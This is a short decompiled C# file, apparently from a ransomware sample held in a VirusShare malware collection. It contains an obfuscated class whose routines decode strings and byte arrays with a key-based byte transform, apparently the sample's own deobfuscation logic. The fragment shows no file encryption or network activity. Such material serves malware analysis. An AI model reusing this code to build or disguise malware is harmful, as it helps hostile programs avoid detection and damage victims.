// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLB, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 273A448B-459A-4DB6-844A-AD8F16DBC137
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00030-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-34f6b3bc39d40e01d57013b70665df0b46afaccf0ad5f6f6022f2d1256915b88.exe.exe

using \u0093\u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace \u0093\u000E
{
  internal class \u0092\u0002
  {
    [DebuggerNonUserCode]
    public \u0092\u0002()
    {
    }

    public static string \u0091\u000E([In] string obj0, [In] string obj1)
    {
      string str;
      try
      {
        str = \u0014.\u007E\u001A((object) \u0011.\u0015(), \u0092\u0002.\u0092\u000E(\u0012.\u0018(obj0), \u0013.\u007E\u0019((object) \u0011.\u0015(), obj1)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0016.\u001C();
      }
      return str;
    }

    public static byte[] \u0092\u000E([In] byte[] obj0, [In] byte[] obj1)
    {
      int num1 = (int) obj0[checked (obj0.Length - 1)];
      byte[] numArray1 = new byte[checked (obj0.Length - 2 + 1)];
      short index1 = 0;
      byte[] numArray2;
      try
      {
        int num2 = checked (obj0.Length - 2);
        int index2 = 0;
        while (index2 <= num2)
        {
          if ((int) index1 >= obj1.Length)
            index1 = (short) 0;
          if (index2 < checked (obj0.Length - 1))
          {
            numArray1[index2] = \u0017.\u001E(checked ((int) obj0[index2] - unchecked (numArray1.Length % obj1.Length) - (int) obj1[(int) index1] + num1));
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        numArray2 = numArray1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray2 = numArray1;
        \u0016.\u001C();
      }
      return numArray2;
    }
  }
}
